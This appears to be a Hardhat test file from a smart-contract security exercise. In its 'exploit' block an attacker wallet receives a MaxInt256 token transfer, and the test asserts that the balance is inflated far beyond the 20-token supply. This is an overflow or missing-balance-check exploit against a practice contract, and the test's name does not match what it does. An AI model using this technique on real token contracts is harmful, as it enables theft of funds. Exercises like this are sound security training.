import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers, network } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { Contract } from 'ethers';

describe('Start Point', async function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();
    const tokenFactory = await ethers.getContractFactory('Token');

    const tokenContract = await tokenFactory.deploy(
      ethers.utils.parseEther('20')
    );

    return {
      tokenContract,
      owner,
      attackerWallet,
    };
  }

  describe('exploit', async function () {
    let tokenContract: Contract,
      owner: SignerWithAddress,
      attackerWallet: SignerWithAddress;

    before(async function () {
      ({ tokenContract, owner, attackerWallet } = await loadFixture(setup));
    });

    it('Should lock guess and settle', async function () {
      await tokenContract.transfer(
        attackerWallet.address,
        ethers.constants.MaxInt256
      );

      expect(
        await tokenContract.balanceOf(attackerWallet.address)
      ).to.be.greaterThan(
        ethers.utils.parseEther('20000000000000000000000000')
      );
    });
  });
});
